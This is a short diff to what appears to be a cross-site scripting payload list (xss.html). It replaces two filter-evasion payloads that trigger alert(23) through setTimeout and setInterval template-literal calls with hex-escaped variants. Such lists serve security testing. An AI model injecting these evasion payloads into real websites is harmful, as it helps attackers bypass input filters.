@@ -33,8 +33,8 @@ xss.html
 [Bo0oM](https://twitter.com/i_bo0om/status/687652257609957376)
 
 
-    setTimeout`alert\`23\``
-    setInterval`alert\`23\``
+    setTimeout`alert\x2823\x29`
+    setInterval`alert\x2823\x29`
     
 ---
 
